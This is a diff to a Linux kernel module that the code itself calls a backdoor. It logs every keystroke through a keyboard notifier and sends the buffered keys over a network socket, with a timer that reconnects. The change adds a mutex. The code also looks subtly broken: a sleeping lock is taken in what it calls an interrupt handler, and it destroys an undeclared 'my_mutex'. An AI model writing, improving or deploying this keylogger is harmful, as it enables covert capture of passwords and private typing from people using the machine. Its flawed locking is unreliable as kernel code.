@@ -6,6 +6,7 @@
 #include <linux/interrupt.h>
 #include <linux/delay.h>
 #include <linux/timer.h>
+#include <linux/mutex.h>
 
 #include "backdoor.h"
 #include "networking.h"
@@ -20,10 +21,15 @@ static char keystrokes[KEY_BUFFER_SIZE + 1] = "";
 // Timer to reinitialize connection
 static struct timer_list connection_timer;
 
+// Mutex between sock refreshment and other resources.
+static struct mutex socks_mutex;
+
 // Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
     static int32_t buffer_count = 0; // Counts how many chars have been logged.
     struct keyboard_notifier_param *param = dev_id;
+
+    mutex_lock(&socks_mutex);
 
     if (param && param->value) {
         uint32_t keycode = param->value;
@@ -37,9 +43,10 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 
         if (buffer_count == 0) {
             send_message(keystrokes);
-            mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
         }
     }
+
+    mutex_unlock(&socks_mutex);
 
     return IRQ_NONE;
 }
@@ -64,6 +71,8 @@ void initialize_conn(struct timer_list *t) {
     if (result < 0) {
         printk(KERN_ERR "Failed to connect\n");
     }
+
+    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
 }
 
 
@@ -77,6 +86,9 @@ static int __init keyboard_module_init(void) {
     }
 
     setup_timer(&connection_timer, initialize_conn, 0);
+    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
+
+    mutex_init(&socks_mutex);
 
     // Register the keyboard notifier
     result = register_keyboard_notifier(&keyboard_notifier_block);
@@ -93,14 +105,16 @@ static void __exit keyboard_module_exit(void) {
     int ret;
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_notifier_block);
-    ret = shutdown_socket();
 
+    ret = shutdown_socket();
     if (ret < 0) {
-	printk(KERN_ERR "Unable to release socket");
-	return;
+	    printk(KERN_ERR "Unable to release socket");
+	    return;
     }
 
     del_timer(&connection_timer);
+    mutex_destroy(&my_mutex);
+    
     printk(KERN_INFO "Backdoor module exited\n");
 }
 
